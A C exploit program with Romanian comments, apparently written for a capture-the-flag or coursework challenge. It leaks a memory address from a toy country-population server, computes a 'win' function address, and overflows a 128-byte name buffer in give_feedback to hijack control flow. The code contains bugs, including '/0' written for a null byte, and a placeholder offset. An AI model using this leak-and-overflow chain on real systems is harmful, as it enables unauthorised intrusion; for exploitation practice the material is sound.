#include "request.h"

//TO BE UPDATED
#define OFFSET_TO_WIN 1000

int main()
{
    int ret;


    /* Ne asiguram ca avem o tara cu 0 populatie */
    struct request add_country = {0};
    add_country.message = "ADD dummy_country 0";
    add_country.message_length = strlen(add_country.message);

    ret = create_request(&add_country, 1024);
    if (ret != 0)
    {
        puts("Err add_country");
        return -1;
    }

    sleep(1);


    /* Dam leak la adresa variabilei population */
    struct request leak = {0};
    leak.message = "POP dummy_country";
    leak.message_length = strlen(leak.message);

    ret = create_request(&leak, 1024);
    if (ret != 0)
    {
        puts("Err leak");
        return -1;
    }
    ret = read_response(&leak);


    /* Calculam adresa functiei win cu ajutorul adresei la care am dat leak */
    uint64_t pop_adr = strtoull(leak.response, NULL, 0);
    int * win_adr = pop_adr + OFFSET_TO_WIN;


    /* Pregatim numele pe care il vom pasa ca argument lui give_feedback */
    int win_adr_size = sizeof(win_adr);
    const int PADDING = 0;
    const int NAME_BUFF_SIZE = 128;

    int name_overflow_len = NAME_BUFF_SIZE + PADDING + win_adr_size + 1;
    char name_overflow[name_overflow_len];

    for (int i = 0; i < NAME_BUFF_SIZE + PADDING; i++)
        name_overflow[i] = 'h';
    for (int i = 0; i < win_adr_size; i++)
        name_overflow[NAME_BUFF_SIZE + PADDING + i] = ((char *) &win_adr)[i];
    name_overflow[name_overflow_len - 1] = '/0';


    /* Cream request-ul pentru give_feedback */
    const char * REQ = "WRT ";
    const char * FEEDBACK_LEN = " 0 ";
    const char * LANG_ID = "0";
    char give_feedback_req[strlen(REQ) + name_overflow_len + strlen(FEEDBACK_LEN) + strlen(LANG_ID) + 1];
    strcpy(give_feedback_req, REQ);
    strcat(give_feedback_req, name_overflow);
    strcat(give_feedback_req, FEEDBACK_LEN);
    strcat(give_feedback_req, LANG_ID);


    /* Exploatam give_feedback */
    struct request give_feedback = {0};
    give_feedback.message = give_feedback_req;
    give_feedback.message_length = strlen(give_feedback.message);

    ret = create_request(&give_feedback, 1024);
    if (ret != 0)
    {
        puts("Err give feedback");
        return -1;
    }

    sleep(1);

    ret = read_response(&give_feedback);
    if (ret != 0)
    {
        puts("Err read response");
        return -1;
    }

    
    // printing the result of the exploit
    puts(give_feedback.response);

    close_request(&give_feedback);
    close_request(&leak);
    close_request(&add_country);

    return 0;
}